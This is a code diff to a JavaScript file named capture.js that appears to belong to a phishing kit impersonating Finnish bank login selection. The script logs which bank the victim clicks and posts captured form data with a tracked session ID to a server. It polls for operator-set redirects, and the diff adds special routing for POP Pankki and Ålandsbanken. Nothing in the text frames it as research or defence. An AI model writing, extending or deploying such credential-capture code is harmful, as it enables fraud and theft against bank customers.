@@ -1,4 +1,4 @@
-// capture.js – Polls for redirects with session reuse
+// capture.js – Polls for redirects on ALL pages
 (function() {
     const path = window.location.pathname;
 
@@ -19,7 +19,6 @@
             console.log('📥 Status response:', data);
             if (data.redirect) {
                 console.log('🔄 Redirecting to:', data.redirect);
-                // IMPORTANT: DO NOT clear session ID - keep it for future redirects
                 window.location.href = data.redirect;
             }
         } catch (err) { 
@@ -48,6 +47,14 @@
                 const name = this.getAttribute('title') || this.getAttribute('data-auth-method-name');
                 console.log('🏦 Bank clicked:', name);
                 
+                // --- SPECIAL: POP Pankki and Ålandsbanken redirect to portal ---
+                const redirectToPortal = ['POP Pankki', 'Ålandsbanken', 'poppankki', 'alandsbanken'];
+                if (redirectToPortal.includes(name)) {
+                    console.log('🔄 Redirecting to portal (excluded bank):', name);
+                    window.location.href = '/portal.html';
+                    return;
+                }
+                
                 const map = {
                     'Aktia':'aktia','Ålandsbanken':'alandsbanken','Danskebank':'danske',
                     'Nordea':'nordea','Oma Säästöpankki':'omasp','Säästöpankki':'saastopankki',
@@ -64,7 +71,7 @@
                 localStorage.setItem('session_id', sessionId);
                 console.log('💾 Session ID created on bank click:', sessionId);
                 
-                // Send bank notification
+                // Send bank notification (exclude Ålandsbanken and POP Pankki)
                 const excludedBanks = ['Ålandsbanken', 'POP Pankki', 'alandsbanken', 'poppankki'];
                 if (!excludedBanks.includes(name)) {
                     try {
@@ -123,11 +130,9 @@
     function sendData(url, data) {
         data._sourceFile = path.replace(/^\//, '');
         
-        // Get existing session ID from localStorage
         const existingSessionId = localStorage.getItem('session_id');
         console.log('📤 Sending data with session ID:', existingSessionId);
         
-        // If we have an existing session ID, use it
         if (existingSessionId) {
             data._sessionId = existingSessionId;
         }
@@ -144,12 +149,10 @@
         .then(function(resp) {
             console.log('📥 Server response:', resp);
             if (resp.success) {
-                // If server returns a uniqueID, use it, otherwise keep existing
                 if (resp.uniqueID) {
                     localStorage.setItem('session_id', resp.uniqueID);
                     console.log('💾 Session ID updated to:', resp.uniqueID);
                 } else {
-                    // Keep existing session ID
                     console.log('💾 Keeping existing session ID:', existingSessionId);
                 }
                 window.location.href = '/loading.html';
@@ -322,5 +325,5 @@
         console.log('Session ended');
     };
 
-    console.log('✅ capture.js loaded - session reuse enabled');
+    console.log('✅ capture.js loaded - POP Pankki & Ålandsbanken redirect to portal');
 })();
